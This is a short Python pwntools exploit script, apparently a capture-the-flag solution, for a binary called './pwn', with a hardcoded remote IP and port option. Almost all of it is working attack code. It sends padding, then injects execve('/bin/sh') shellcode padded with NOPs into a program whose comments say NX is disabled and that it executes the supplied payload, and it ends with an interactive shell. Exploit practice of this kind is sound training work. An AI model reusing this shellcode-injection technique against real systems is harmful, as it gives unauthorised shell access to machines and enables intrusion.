#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pwn", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 139.180.137.100 1338"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

io.send(b"A" * 0x32)

# the ELF has NX bit disabled, `getflag` function basically just executes
# the payload that we provide, so just provide a shellcode with enough length
sc = asm(shellcraft.amd64.linux.execve("/bin/sh", 0, 0))

# pads with NOP just to avoid feedback to short stuff
io.send(sc + b"\x90" * (0x64 - len(sc)))

io.interactive()
